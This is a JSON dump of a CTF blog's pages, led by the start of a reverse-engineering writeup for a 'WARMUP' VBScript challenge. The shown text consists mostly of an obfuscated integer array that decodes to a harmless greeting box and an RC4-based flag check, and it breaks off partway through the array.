[{"content":"","date":"2025-04-07","externalUrl":null,"permalink":"/","section":"1n1t-Flare Blog","summary":"","title":"1n1t-Flare Blog","type":"page"},{"content":"","date":"2025-04-07","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF","type":"tags"},{"content":"","date":"2025-04-07","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":"","date":"2025-04-07","externalUrl":null,"permalink":"/tags/reverse/","section":"Tags","summary":"","title":"Reverse","type":"tags"},{"content":"","date":"2025-04-07","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"2025-04-07","externalUrl":null,"permalink":"/writeups/","section":"Writeups","summary":"","title":"Writeups","type":"writeups"},{"content":" Reverse # WARMUP # vbs脚本，先写个脚本去混淆\nsrc = [int( 667205/8665 ) , int( -7671+7786 ) , int( 8541-8438 ) , int( 422928/6408 ) , int( -1948+2059 ) , int( -3066+3186 ) , int( 756-724 ) , int( 4080/120 ) , int( -3615+3683 ) , int( -1619+1720 ) , int( -2679+2776 ) , int( 659718/5787 ) , int( 302752/9461 ) , int( -6627+6694 ) , int( -4261+4345 ) , int( 81690/1167 ) , int( 636180/9220 ) , int( 538658/6569 ) , int( -1542+1588 ) , int( -1644+1676 ) , int( 122184/1697 ) , int( 966411/9963 ) , int( 2186-2068 ) , int( -5283+5384 ) , int( 305056/9533 ) , int( 66402/651 ) , int( 1141452/9756 ) , int( 882090/8019 ) , int( -4243+4275 ) , int( 2669-2564 ) , int( 83+27 ) , int( 254880/7965 ) , int( -1291+1379 ) , int( -4699+4788 ) , int( 4730-4663 ) , int( -1179+1263 ) , int( 5274-5204 ) , int( 210144/6567 ) , int( -6803+6853 ) , int( 6655-6607 ) , int( 4067-4017 ) , int( 121900/2300 ) , int( -6158+6191 ) , int( 11934/351 ) , int( 64883/4991 ) , int( 65420/6542 ) , int( 3781-3679 ) , int( 1612-1504 ) , int( 892788/9204 ) , int( 927618/9006 ) , int( -6692+6724 ) , int( 410591/6731 ) , int( 6675-6643 ) , int( 697880/9560 ) , int( 4250-4140 ) , int( 5464-5352 ) , int( -1082+1199 ) , int( 3343-3227 ) , int( 1211-1145 ) , int( 482406/4346 ) , int( -5549+5669 ) , int( -5150+5190 ) , int( 4400-4366 ) , int( -3277+3346 ) , int( -6649+6759 ) , int( -5669+5785 ) , int( -6734+6835 ) , int( 9757-9643 ) , int( 109-77 ) , int( 5620-5504 ) , int( -2887+2991 ) , int( -3081+3182 ) , int( -5109+5141 ) , int( 699860/9998 ) , int( -3603+3679 ) , int( 1631-1566 ) , int( 445-374 ) , int( 294118/5071 ) , int( -1115+1149 ) , int( 222376/5054 ) , int( 8137-8105 ) , int( -1653+1687 ) , int( 357104/4058 ) , int( 1650-1561 ) , int( -9501+9568 ) , int( 1047-963 ) , int( 2540-2470 ) , int( 1692-1658 ) , int( 9947-9906 ) , int( 9186-9173 ) , int( -2846+2856 ) , int( 425187/3573 ) , int( -3066+3167 ) , int( 2850-2748 ) , int( -2992+3090 ) , int( 958230/8190 ) , int( 869295/7305 ) , int( 3380-3275 ) , int( -7338+7455 ) , int( 408848/4048 ) , int( 9211-9179 ) , int( -2437+2498 ) , int( 1672-1640 ) , int( 2378-2344 ) , int( 544749/9557 ) , int( 351120/7315 ) , int( 773800/7738 ) , int( 2033-1931 ) , int( -8059+8111 ) , int( -4731+4783 ) , int( -9204+9252 ) , int( -4261+4316 ) , int( 850521/8421 ) , int( -7011+7112 ) , int( 292272/6089 ) , int( -8609+8666 ) , int( -2921+2972 ) , int( 6772-6672 ) , int( 487611/9561 ) , int( -6754+6802 ) , int( 464835/8155 ) , int( -939+987 ) , int( 421173/7389 ) , int( -8145+8201 ) , int( 9368-9268 ) , int( -7682+7738 ) , int( -8646+8699 ) , int( 484612/4996 ) , int( 286832/5516 ) , int( -9710+9760 ) , int( 884156/9022 ) , int( 7080-6979 ) , int( 265477/5009 ) , int( 6+49 ) , int( 5395-5298 ) , int( 6645-6595 ) , int( -9706+9763 ) , int( -6697+6752 ) , int( 927-870 ) , int( 4048-3946 ) , int( 34398/702 ) , int( 825675/8175 ) , int( -438+491 ) , int( 87808/1792 ) , int( -2601+2653 ) , int( 420228/7782 ) , int( -5266+5317 ) , int( 53059/547 ) , int( 477054/9354 ) , int( 9238-9189 ) , int( 799112/7912 ) , int( 3340-3284 ) , int( 8544-8444 ) , int( 1220-1171 ) , int( -7192+7245 ) , int( 73629/729 ) , int( 6523-6473 ) , int( 2761-2659 ) , int( 358124/3692 ) , int( -6167+6266 ) , int( -3842+3894 ) , int( 7840-7739 ) , int( -3980+4036 ) , int( 987-935 ) , int( 6868/68 ) , int( -559+656 ) , int( 6513-6465 ) , int( 843300/8433 ) , int( -8159+8261 ) , int( -753+807 ) , int( 278700/5574 ) , int( 5600/112 ) , int( -549+646 ) , int( -7697+7750 ) , int( 390292/7364 ) , int( 988020/9980 ) , int( -3250+3302 ) , int( 6295-6195 ) , int( 4342-4242 ) , int( -9602+9704 ) , int( 1312-1214 ) , int( 1065-1012 ) , int( 1122/22 ) , int( 191012/3604 ) , int( 330775/3275 ) , int( 226848/2224 ) , int( 4973-4922 ) , int( 369357/3657 ) , int( -7229+7282 ) , int( 588/12 ) , int( 57570/570 ) , int( 4554-4498 ) , int( 483924/4938 ) , int( 485600/9712 ) , int( 5051-4998 ) , int( 8467-8417 ) , int( -6799+6855 ) , int( 668360/6820 ) , int( 428008/7643 ) , int( -309+359 ) , int( -7495+7549 ) , int( 198200/1982 ) , int( -4298+4351 ) , int( 2979-2928 ) , int( -391+443 ) , int( -5951+6006 ) , int( -2271+2372 ) , int( 1431-1382 ) , int( -2812+2866 ) , int( 4906-4853 ) , int( -5308+5365 ) , int( -8587+8636 ) , int( -1003+1053 ) , int( 468741/4641 ) , int( 8449-8392 ) , int( 14877/261 ) , int( -5097+5146 ) , int( 6695-6646 ) , int( -2866+2922 ) , int( 483786/9486 ) , int( -4142+4193 ) , int( 2347-2296 ) , int( -1784+1833 ) , int( 116229/2193 ) , int( -1099+1148 ) , int( 8230-8180 ) , int( -4351+4406 ) , int( 1975-1924 ) , int( 779229/7871 ) , int( 102960/1040 ) , int( 67830/1330 ) , int( -4771+4873 ) , int( -32+129 ) , int( 155456/2776 ) , int( 9798-9700 ) , int( 4944-4894 ) , int( -2496+2594 ) , int( 5495-5444 ) , int( 8113-8015 ) , int( -8444+8496 ) , int( 3896-3847 ) , int( 6306-6255 ) , int( 1284-1185 ) , int( 1003986/9843 ) , int( -1321+1371 ) , int( 2676-2578 ) , int( -5421+5521 ) , int( 564186/5757 ) , int( 6608-6559 ) , int( 7038-6937 ) , int( 209720/3745 ) , int( -616+715 ) , int( 9766-9709 ) , int( 2111-2012 ) , int( 528993/9981 ) , int( 1901-1851 ) , int( 281344/5024 ) , int( 5695-5641 ) , int( 4815-4762 ) , int( 399556/3956 ) , int( 572730/5615 ) , int( -5718+5817 ) , int( 21+27 ) , int( 4532-4475 ) , int( -8446+8499 ) , int( 5786-5689 ) , int( 4177-4121 ) , int( -8411+8511 ) , int( -9499+9599 ) , int( 479528/8563 ) , int( 6850-6793 ) , int( -3725+3823 ) , int( -8692+8743 ) , int( 284298/2901 ) , int( 214302/4202 ) , int( 576675/5825 ) , int( -4565+4667 ) , int( -7223+7321 ) , int( 383278/3911 ) , int( -2540+2590 ) , int( 35+13 ) , int( -5549+5597 ) , int( 969122/9889 ) , int( 964712/9844 ) , int( -6231+6328 ) , int( -1560+1660 ) , int( -7416+7514 ) , int( 609144/5972 ) , int( 471432/9066 ) , int( -4500+4597 ) , int( 8620-8566 ) , int( 7113-7014 ) , int( -2488+2588 ) , int( -3599+3651 ) , int( 211956/6234 ) , int( 1697-1665 ) , int( -5122+5161 ) , int( -3189+3221 ) , int( -5840+114 ) , int( -37790+6278 ) , int( -8.231351E+07/3957 ) , int( -14110+7864 ) , int( -30457-1205 ) , int( 9930-9863 ) , int( 107-55 ) , int( 517-7291 ) , int( -31263+6916 ) , int( -29685+9083 ) , int( -2.138515E+07/3442 ) , int( -26304-1370 ) , int( -1.510879E+08/6060 ) , int( -903-3261 ) , int( -22484-8007 ) , int( -34437+5126 ) , int( -10635+3856 ) , int( -1.97004E+08/9374 ) , int( -1.079768E+08/6550 ) , int( -2.533546E+07/3739 ) , int( -25645+6931 ) , int( -1.720817E+08/7056 ) , int( -12498+5774 ) , int( -2.164872E+08/7546 ) , int( -8955-8316 ) , int( -3584+3597 ) , int( -1280+1290 ) , int( 795633/7041 ) , int( 291669/2451 ) , int( 9044-8942 ) , int( 264014/2614 ) , int( -7841+7873 ) , int( 10919/179 ) , int( 22272/696 ) , int( -8135+8169 ) , int( -5733+5847 ) , int( 371547/3753 ) , int( 473980/9115 ) , int( 391-284 ) , int( -1824+1925 ) , int( -1707+1828 ) , int( 2151-2117 ) , int( 2535/195 ) , int( 7236-7226 ) , int( 58097/4469 ) , int( 2710/271 ) , int( 118677/3043 ) , int( -7992+8024 ) , int( -5.682766E+07/8145 ) , int( -3.747722E+07/1805 ) , int( -20535-2876 ) , int( -5076000/750 ) , int( -28220-733 ) , int( -33583+7603 ) , int( 7730-7648 ) , int( 7057-6990 ) , int( 338728/6514 ) , int( -4.203267E+07/6205 ) , int( -20128-4219 ) , int( -29090+8488 ) , int( -7954+1177 ) , int( -25730+8808 ) , int( -23859-3357 ) , int( -2130+2143 ) , int( 6827-6817 ) , int( 4334-4264 ) , int( 4851-4734 ) , int( 5121-5011 ) , int( 7034-6935 ) , int( 4197-4081 ) , int( -1823+1928 ) , int( 1032744/9304 ) , int( 1547-1437 ) , int( -7393+7425 ) , int( 608932/7426 ) , int( 864513/7389 ) , int( 1748-1638 ) , int( 501676/6118 ) , int( 510473/7619 ) , int( -6752+6792 ) , int( -5142+5257 ) , int( -9558+9635 ) , int( 7906-7805 ) , int( 5308-5193 ) , int( 163300/1420 ) , int( 10961/113 ) , int( 740364/7188 ) , int( -5327+5428 ) , int( 5703-5659 ) , int( -7307+7339 ) , int( 445970/3878 ) , int( 608-492 ) , int( -4799+4913 ) , int( -3687+3762 ) , int( 9993-9892 ) , int( 1032493/8533 ) , int( 103607/2527 ) , int( 123266/9482 ) , int( 61520/6152 ) , int( 251424/7857 ) , int( 104032/3251 ) , int( -7228+7260 ) , int( 239648/7489 ) , int( -1858+1926 ) , int( 865515/8243 ) , int( 818481/7509 ) , int( 244384/7637 ) , int( -4252+4359 ) , int( 10+66 ) , int( -3202+3303 ) , int( 466070/4237 ) , int( 3973-3929 ) , int( -7658+7690 ) , int( 563430/5366 ) , int( 168872/3838 ) , int( 306144/9567 ) , int( 158046/1491 ) , int( 311740/7085 ) , int( -6862+6894 ) , int( 621760/5360 ) , int( -8151+8252 ) , int( 9608-9499 ) , int( 309680/2765 ) , int( 244288/5552 ) , int( 6191-6159 ) , int( 705936/6303 ) , int( 4828-4717 ) , int( 1097330/9542 ) , int( 431596/9809 ) , int( -8819+8851 ) , int( 546675/4925 ) , int( 805545/6885 ) , int( -5087+5203 ) , int( 1223-1151 ) , int( 9566-9465 ) , int( 2413-2293 ) , int( 4760-4747 ) , int( -4859+4869 ) , int( 3357-3325 ) , int( 667-635 ) , int( -2223+2255 ) , int( 4357-4325 ) , int( 366928/5396 ) , int( 203175/1935 ) , int( -7837+7946 ) , int( 47936/1498 ) , int( 3589-3474 ) , int( 254920/6373 ) , int( 3498-3448 ) , int( 54113/1021 ) , int( 9319-9266 ) , int( 380767/9287 ) , int( 298804/6791 ) , int( -5151+5183 ) , int( 3487-3380 ) , int( 246760/6169 ) , int( 7465-7415 ) , int( -8879+8932 ) , int( -281+334 ) , int( 314470/7670 ) , int( -1151+1164 ) , int( 4880-4870 ) , int( 3582-3550 ) , int( 147008/4594 ) , int( 169248/5289 ) , int( -8224+8256 ) , int( 4654/358 ) , int( -2894+2904 ) , int( 3479-3447 ) , int( 2036-2004 ) , int( 7024-6992 ) , int( -8686+8718 ) , int( -664+703 ) , int( 53952/1686 ) , int( -10371+3595 ) , int( -21805-3310 ) , int( -1.930486E+08/8525 ) , int( -6242-530 ) , int( -2.479211E+08/9214 ) , int( -28712+8110 ) , int( 4047-9789 ) , int( 278397/4419 ) , int( -6794+6804 ) , int( 310624/9707 ) , int( 120896/3778 ) , int( 6925-6893 ) , int( 8256-8224 ) , int( -4736+4843 ) , int( 1256-1180 ) , int( 4250-4149 ) , int( -9132+9242 ) , int( 173344/5417 ) , int( -9030+9091 ) , int( 72-40 ) , int( 344204/4529 ) , int( 351985/3485 ) , int( 6120-6010 ) , int( 1113-1073 ) , int( 2781-2666 ) , int( 6375-6259 ) , int( 780330/6845 ) , int( 106050/1414 ) , int( 1239-1138 ) , int( -986+1107 ) , int( 324351/7911 ) , int( -7872+7885 ) , int( -1326+1336 ) , int( 17728/554 ) , int( 61600/1925 ) , int( -4930+4962 ) , int( 113856/3558 ) , int( -7210+7280 ) , int( 3126-3015 ) , int( 9894-9780 ) , int( 2040-2008 ) , int( 957810/9122 ) , int( -1680+1712 ) , int( -7068+7129 ) , int( -9765+9797 ) , int( 4121-4073 ) , int( -9924+9956 ) , int( -4370+4454 ) , int( 437340/3940 ) , int( 5315-5283 ) , int( 304500/6090 ) , int( -6807+6860 ) , int( 19186/362 ) , int( -6044+6057 ) , int( 9876-9866 ) , int( -2071+2103 ) , int( 8923-8891 ) , int( 4890-4858 ) , int( 7473-7441 ) , int( 5632-5600 ) , int( 8294-8262 ) , int( -271+303 ) , int( 6410-6378 ) , int( 5536-5421 ) , int( 44720/1118 ) , int( 6272-6167 ) , int( 26568/648 ) , int( 233440/7295 ) , int( -8944+9005 ) , int( 204192/6381 ) , int( 5731-5626 ) , int( 9617-9604 ) , int( 7388-7378 ) , int( 960/30 ) , int( 99008/3094 ) , int( 8422-8390 ) , int( 19136/598 ) , int( -6328+6360 ) , int( 199712/6241 ) , int( -2315+2347 ) , int( -6898+6930 ) , int( 9875-9768 ) , int( -4621+4661 ) , int( -7725+7830 ) , int( -3507+3548 ) , int( 4844-4812 ) , int( 570716/9356 ) , int( -3814+3846 ) , int( -1467+1532 ) , int( 138115/1201 ) , int( -7634+7733 ) , int( -7021+7061 ) , int( 942-865 ) , int( 924630/8806 ) , int( 8706-8606 ) , int( -6756+6796 ) , int( -5325+5440 ) , int( 2765-2649 ) , int( -7079+7193 ) , int( 2100/28 ) , int( 8156-8055 ) , int( -7792+7913 ) , int( 5324/121 ) , int( 6423-6391 ) , int( 5454-5414 ) , int( -4828+4933 ) , int( 13504/422 ) , int( 244552/3176 ) , int( -3016+3127 ) , int( -4103+4203 ) , int( 2567-2535 ) , int( 435-328 ) , int( 787-711 ) , int( 1474-1373 ) , int( 803550/7305 ) , int( -5410+5451 ) , int( -6556+6588 ) , int( -2204+2247 ) , int( 223424/6982 ) , int( -8753+8802 ) , int( 135872/3088 ) , int( -7757+7789 ) , int( 272-223 ) , int( 340177/8297 ) , int( 1487-1446 ) , int( -9083+9115 ) , int( 7132-7093 ) , int( 4540-4508 ) , int( -13541+6804 ) , int( -7.75285E+07/2501 ) , int( -32055+4060 ) , int( -1318-5661 ) , int( -5.265648E+07/3209 ) , int( -31857+4377 ) , int( 585065/9001 ) , int( -2558+2641 ) , int( -8549+8616 ) , int( 6403-6330 ) , int( 6271-6198 ) , int( -2.477346E+07/3988 ) , int( -17020-9885 ) , int( -2542488/104 ) , int( -1327+1340 ) , int( -887+897 ) , int( -7751+7783 ) , int( 2629-2597 ) , int( -6489+6521 ) , int( 2254-2222 ) , int( 154518/1981 ) , int( -764+865 ) , int( 629040/5242 ) , int( 1098636/9471 ) , int( 78793/6061 ) , int( -7110+7120 ) , int( -7378+7410 ) , int( -1777+1809 ) , int( 2538-2506 ) , int( 119392/3731 ) , int( -4327+4340 ) , int( 10580/1058 ) , int( -7677+7709 ) , int( 8254-8222 ) , int( 3782-3750 ) , int( 214240/6695 ) , int( 7006-6967 ) , int( 8305-8273 ) , int( 4841-4766 ) , int( 937-854 ) , int( 616460/9484 ) , int( -16-6721 ) , int( -28078-2921 ) , int( -24670-3325 ) , int( -9340+3372 ) , int( -25211-6560 ) , int( -22908+5154 ) , int( 6567-6554 ) , int( -635+645 ) , int( -5907+5939 ) , int( 4841-4809 ) , int( 20576/643 ) , int( -2196+2228 ) , int( 3270-3164 ) , int( 212384/6637 ) , int( 509533/8353 ) , int( 94368/2949 ) , int( -1648+1696 ) , int( 23335/1795 ) , int( -86+96 ) , int( 209408/6544 ) , int( 5186-5154 ) , int( 91072/2846 ) , int( 8978-8946 ) , int( 45850/655 ) , int( 256632/2312 ) , int( -8647+8761 ) , int( 5661-5629 ) , int( 191940/1828 ) , int( 2132-2100 ) , int( -9855+9916 ) , int( 3562-3530 ) , int( 24864/518 ) , int( 275424/8607 ) , int( 3176-3092 ) , int( 3798-3687 ) , int( -6055+6087 ) , int( -6024+6074 ) , int( -6425+6478 ) , int( -9745+9798 ) , int( 23387/1799 ) , int( -3891+3901 ) , int( -4637+4669 ) , int( -3183+3215 ) , int( 9860-9828 ) , int( 1677-1645 ) , int( 3698-3666 ) , int( -7915+7947 ) , int( 200128/6254 ) , int( -3984+4016 ) , int( 5982-5876 ) , int( -5627+5659 ) , int( 6122-6061 ) , int( -5851+5883 ) , int( 204520/5113 ) , int( -566+672 ) , int( 260512/8141 ) , int( 7314-7271 ) , int( -1563+1595 ) , int( 5079-4964 ) , int( 11680/292 ) , int( 8464-8359 ) , int( 6991-6950 ) , int( -3136+3168 ) , int( 4262-4219 ) , int( 4518-4486 ) , int( 9317-9210 ) , int( 7615-7575 ) , int( 55650/530 ) , int( 1185-1144 ) , int( 7853-7812 ) , int( -3099+3131 ) , int( 288288/3744 ) , int( -8871+8982 ) , int( -8502+8602 ) , int( 2470-2438 ) , int( 364100/7282 ) , int( -8754+8807 ) , int( 476874/8831 ) , int( 768-755 ) , int( 8485-8475 ) , int( -6548+6580 ) , int( 68960/2155 ) , int( 31904/997 ) , int( 113792/3556 ) , int( -8387+8419 ) , int( 116448/3639 ) , int( 279552/8736 ) , int( -2637+2669 ) , int( -5483+5599 ) , int( 4853-4752 ) , int( -7090+7199 ) , int( 544320/4860 ) , int( 305600/9550 ) , int( 510570/8370 ) , int( 72640/2270 ) , int( 3200-3085 ) , int( -6820+6860 ) , int( 396375/3775 ) , int( -7447+7488 ) , int( -9189+9202 ) , int( -4261+4271 ) , int( 1688-1656 ) , int( 9083-9051 ) , int( 9012-8980 ) , int( -3650+3682 ) , int( 291424/9107 ) , int( 842-810 ) , int( -7058+7090 ) , int( -7119+7151 ) , int( -4515+4630 ) , int( 9315-9275 ) , int( 2216-2111 ) , int( -1847+1888 ) , int( 100192/3131 ) , int( 8671-8610 ) , int( -1498+1530 ) , int( 5376-5261 ) , int( 965-925 ) , int( 597628/5638 ) , int( -6697+6738 ) , int( 9809-9796 ) , int( 740-730 ) , int( 4866-4834 ) , int( 8064-8032 ) , int( 8204-8172 ) , int( 6706-6674 ) , int( -3302+3334 ) , int( -9585+9617 ) , int( 8259-8227 ) , int( 9319-9287 ) , int( 6042-5927 ) , int( -4563+4603 ) , int( 843124/7954 ) , int( -468+509 ) , int( 91-59 ) , int( 55+6 ) , int( -470+502 ) , int( 8800-8684 ) , int( -732+833 ) , int( 1859-1750 ) , int( -9065+9177 ) , int( -3551+3564 ) , int( -5998+6008 ) , int( 309248/9664 ) , int( 78080/2440 ) , int( 1337-1305 ) , int( 1031-999 ) , int( -2405+2483 ) , int( 900011/8911 ) , int( 9591-9471 ) , int( 3993-3877 ) , int( 37024/2848 ) , int( 2372-2362 ) , int( -1999+2031 ) , int( 402-370 ) , int( 2339-2307 ) , int( 215232/6726 ) , int( 56706/4362 ) , int( 88610/8861 ) , int( 6347-6315 ) , int( -1057+1089 ) , int( -8215+8247 ) , int( -5359+5391 ) , int( 360048/9232 ) , int( 150208/4694 ) , int( 549760/6872 ) , int( 709710/8655 ) , int( -9253+9324 ) , int( -1875+1940 ) , int( 3060-9834 ) , int( -1.219054E+08/5007 ) , int( -16837-3765 ) , int( -13859+7384 ) , int( -40413+8132 ) , int( -7.735399E+07/3455 ) , int( -3620+3633 ) , int( 7370/737 ) , int( 9207-9175 ) , int( 21216/663 ) , int( -8881+8913 ) , int( 59712/1866 ) , int( 1881-1776 ) , int( 5987-5955 ) , int( 213378/3498 ) , int( 185536/5798 ) , int( -1106+1154 ) , int( -6274+6306 ) , int( 244-186 ) , int( -7680+7712 ) , int( 417216/3936 ) , int( 1383-1351 ) , int( 346419/5679 ) , int( -7913+7945 ) , int( 3201-3153 ) , int( 268160/8380 ) , int( -5532+5590 ) , int( -6959+6991 ) , int( 3356-3245 ) , int( -7222+7339 ) , int( 9549-9433 ) , int( -426+498 ) , int( 510555/5055 ) , int( 699720/5831 ) , int( -5601+5633 ) , int( 260653/4273 ) , int( 26752/836 ) , int( 4148-4114 ) , int( -6483+6517 ) , int( 120601/9277 ) , int( 92430/9243 ) , int( 3296/103 ) , int( 3355-3323 ) , int( 6661-6629 ) , int( -309+341 ) , int( -4300+4370 ) , int( 132090/1190 ) , int( 296742/2603 ) , int( -568+600 ) , int( 576016/5143 ) , int( 4279-4168 ) , int( -3514+3629 ) , int( -7862+7894 ) , int( 201544/3304 ) , int( 6720/210 ) , int( -1246+1295 ) , int( 6539-6507 ) , int( 7479-7395 ) , int( 685536/6176 ) , int( -7312+7344 ) , int( -2052+2128 ) , int( -8510+8611 ) , int( 311630/2833 ) , int( 8715-8675 ) , int( -6734+6849 ) , int( -5728+5805 ) , int( 9955-9854 ) , int( 269445/2343 ) , int( -4059+4174 ) , int( 47142/486 ) , int( 921-818 ) , int( 663-562 ) , int( 164328/4008 ) , int( 23634/1818 ) , int( 82110/8211 ) , int( 5730-5698 ) , int( 245312/7666 ) , int( 1656-1624 ) , int( 269536/8423 ) , int( 168864/5277 ) , int( -2835+2867 ) , int( -9348+9380 ) , int( 216128/6754 ) , int( -6873+6978 ) , int( 8769-8737 ) , int( -7159+7220 ) , int( -2374+2406 ) , int( 145560/3639 ) , int( 84945/809 ) , int( 4967-4935 ) , int( 3533-3490 ) , int( -8222+8254 ) , int( -5971+6020 ) , int( 203811/4971 ) , int( 64768/2024 ) , int( -8894+8971 ) , int( -7605+7716 ) , int( 7530-7430 ) , int( 8961-8929 ) , int( 204800/4096 ) , int( 34291/647 ) , int( 5124-5070 ) , int( 117455/9035 ) , int( 70910/7091 ) , int( 191072/5971 ) , int( -8276+8308 ) , int( 194464/6077 ) , int( 1606-1574 ) , int( 200032/6251 ) , int( -183+215 ) , int( 7729-7697 ) , int( -6288+6320 ) , int( 563-457 ) , int( 48544/1517 ) , int( 504-443 ) , int( -227+259 ) , int( 358600/8965 ) , int( 5705-5599 ) , int( -4736+4768 ) , int( 321554/7478 ) , int( -8525+8557 ) , int( 402615/3501 ) , int( 1320/33 ) , int( 233100/2220 ) , int( 7463-7422 ) , int( 8959-8918 ) , int( 9538-9506 ) , int( -3809+3886 ) , int( 17094/154 ) , int( 3305-3205 ) , int( 5389-5357 ) , int( 101450/2029 ) , int( -2702+2755 ) , int( 422-368 ) , int( 3681-3668 ) , int( 1374-1364 ) , int( 244192/7631 ) , int( 2106-2074 ) , int( 301504/9422 ) , int( 6788-6756 ) , int( 275072/8596 ) , int( -2612+2644 ) , int( 1544-1512 ) , int( 263424/8232 ) , int( 5985-5869 ) , int( 409555/4055 ) , int( 7844-7735 ) , int( 668752/5971 ) , int( 1110-1078 ) , int( -880+941 ) , int( 9828-9796 ) , int( 610650/5310 ) , int( -2213+2253 ) , int( 5697-5592 ) , int( 340505/8305 ) , int( 1757-1744 ) , int( 88340/8834 ) , int( 2986-2954 ) , int( -7747+7779 ) , int( 5952-5920 ) , int( 6697-6665 ) , int( 180160/5630 ) , int( 1671-1639 ) , int( -8613+8645 ) , int( 95904/2997 ) , int( 8994-8879 ) , int( 7256-7216 ) , int( -5776+5881 ) , int( 1529-1488 ) , int( 179680/5615 ) , int( -684+745 ) , int( 119840/3745 ) , int( 828000/7200 ) , int( -1371+1411 ) , int( 2474-2368 ) , int( 144033/3513 ) , int( 1617-1604 ) , int( 9503-9493 ) , int( -1100+1132 ) , int( 211680/6615 ) , int( 7607-7575 ) , int( 5777-5745 ) , int( 319712/9991 ) , int( -9605+9637 ) , int( 140672/4396 ) , int( 3740-3708 ) , int( 92575/805 ) , int( 9363-9323 ) , int( 292136/2756 ) , int( -9536+9577 ) , int( -9310+9342 ) , int( 7634-7573 ) , int( -9716+9748 ) , int( -7090+7206 ) , int( 376-275 ) , int( -6333+6442 ) , int( 3986-3874 ) , int( 3115-3102 ) , int( -2171+2181 ) , int( 100544/3142 ) , int( 74-42 ) , int( -1400+1432 ) , int( 81504/2547 ) , int( 5073-5041 ) , int( 4596-4564 ) , int( 9048-9016 ) , int( -2733+2765 ) , int( -4650+4663 ) , int( -151+161 ) , int( 10592/331 ) , int( 3163-3131 ) , int( 4722-4690 ) , int( 30624/957 ) , int( 2545-2513 ) , int( 251232/7851 ) , int( -2926+2958 ) , int( 239584/7487 ) , int( 389-350 ) , int( -2+34 ) , int( -5.053404E+07/7460 ) , int( -26034+1687 ) , int( -19313-1289 ) , int( -30-6697 ) , int( -17366-1346 ) , int( -15077-1903 ) , int( -6552-432 ) , int( -13927-3764 ) , int( -37232+7921 ) , int( 1107-7886 ) , int( -15477-5539 ) , int( -1.750707E+07/1062 ) , int( -3.826407E+07/5647 ) , int( 364959/5793 ) , int( 2034-2024 ) , int( -7296+7328 ) , int( -3111+3143 ) , int( -3156+3188 ) , int( 7990-7958 ) , int( 166496/5203 ) , int( -4151+4183 ) , int( 4071-4039 ) , int( 9102-9070 ) , int( -6166+6234 ) , int( 283185/2697 ) , int( 3833-3724 ) , int( 119776/3743 ) , int( 658224/5877 ) , int( 7881-7773 ) , int( 390328/4024 ) , int( 8122-8017 ) , int( 934010/8491 ) , int( 579751/8653 ) , int( -8024+8128 ) , int( 57036/588 ) , int( 2457-2343 ) , int( 9781-9737 ) , int( -5599+5631 ) , int( -7710+7809 ) , int( -4501+4606 ) , int( 625072/5581 ) , int( 783432/7533 ) , int( 877488/8688 ) , int( 6473-6359 ) , int( 5963-5897 ) , int( 150282/1242 ) , int( -9775+9891 ) , int( -7486+7587 ) , int( 565-552 ) , int( 5581-5571 ) , int( 771-739 ) , int( 69824/2182 ) , int( 4603-4571 ) , int( -5709+5741 ) , int( 8242-8210 ) , int( 94112/2941 ) , int( 100352/3136 ) , int( -8344+8376 ) , int( -1824+1936 ) , int( 6678-6570 ) , int( 638454/6582 ) , int( 6614-6509 ) , int( 1012990/9209 ) , int( 8744-8677 ) , int( 561912/5403 ) , int( 444163/4579 ) , int( 10089-9975 ) , int( 280960/8780 ) , int( 320128/5248 ) , int( -3399+3431 ) , int( -1771+1836 ) , int( 5417-5302 ) , int( -1824+1923 ) , int( 212600/5315 ) , int( -4973+5050 ) , int( 60060/572 ) , int( 639000/6390 ) , int( 355520/8888 ) , int( 866410/7534 ) , int( 5901-5824 ) , int( 9869-9768 ) , int( -4100+4215 ) , int( 9973-9858 ) , int( 601594/6202 ) , int( 857887/8329 ) , int( -7663+7764 ) , int( -205+249 ) , int( -5719+5751 ) , int( 8618-8506 ) , int( 822732/7412 ) , int( 9707-9592 ) , int( 106832/2428 ) , int( 1917-1885 ) , int( 7491-7442 ) , int( 263507/6427 ) , int( -3050+3091 ) , int( 6688/209 ) , int( 3579-3540 ) , int( 62400/1950 ) , int( -5.533603E+07/8508 ) , int( -1.094461E+07/378 ) , int( -19198-7803 ) , int( -1503-5013 ) , int( -22047-8352 ) , int( -9364+9447 ) , int( -3664+3731 ) , int( 7198-7125 ) , int( 6274-6201 ) , int( -16376+9628 ) , int( -3.882402E+07/1232 ) , int( -35990+7452 ) , int( 59020/4540 ) , int( 32900/3290 ) , int( 51776/1618 ) , int( -7782+7814 ) , int( 9795-9763 ) , int( 254592/7956 ) , int( 83520/2610 ) , int( 7721-7689 ) , int( -7133+7165 ) , int( 1340-1308 ) , int( 330066/3334 ) , int( -9106+9211 ) , int( 6064-5952 ) , int( 6286-6182 ) , int( -9220+9321 ) , int( -2056+2170 ) , int( 279444/4234 ) , int( 5693-5572 ) , int( 7627-7511 ) , int( 9114-9013 ) , int( 128864/4027 ) , int( 465247/7627 ) , int( -1215+1247 ) , int( 9956-9841 ) , int( -6215+6255 ) , int( 26080/652 ) , int( -5167+5282 ) , int( 296520/7413 ) , int( -5640+5745 ) , int( -8069+8110 ) , int( -740+772 ) , int( 92235/2145 ) , int( 6267-6235 ) , int( -3504+3619 ) , int( 11240/281 ) , int( 753448/7108 ) , int( -5324+5365 ) , int( -5911+5952 ) , int( -2746+2778 ) , int( -2953+3030 ) , int( 1074702/9682 ) , int( -3942+4042 ) , int( 8672-8640 ) , int( 3343-3293 ) , int( -9590+9643 ) , int( -1920+1974 ) , int( 190568/4648 ) , int( -8907+8939 ) , int( 4693-4605 ) , int( 4103-3992 ) , int( 1024974/8991 ) , int( 117216/3663 ) , int( -7725+7837 ) , int( 1025460/9495 ) , int( 6361-6264 ) , int( 925995/8819 ) , int( 166210/1511 ) , int( 8106-8039 ) , int( 256672/2468 ) , int( 8511-8414 ) , int( -1592+1706 ) , int( 4349-4336 ) , int( 20-10 ) , int( 131648/4114 ) , int( 3440-3408 ) , int( 3286-3254 ) , int( 86528/2704 ) , int( -209+241 ) , int( 176256/5508 ) , int( -4786+4818 ) , int( 24576/768 ) , int( 973581/8771 ) , int( -5686+5803 ) , int( 1068012/9207 ) , int( 419760/5830 ) , int( 438138/4338 ) , int( 6119-5999 ) , int( 56320/1760 ) , int( -5861+5922 ) , int( -9201+9233 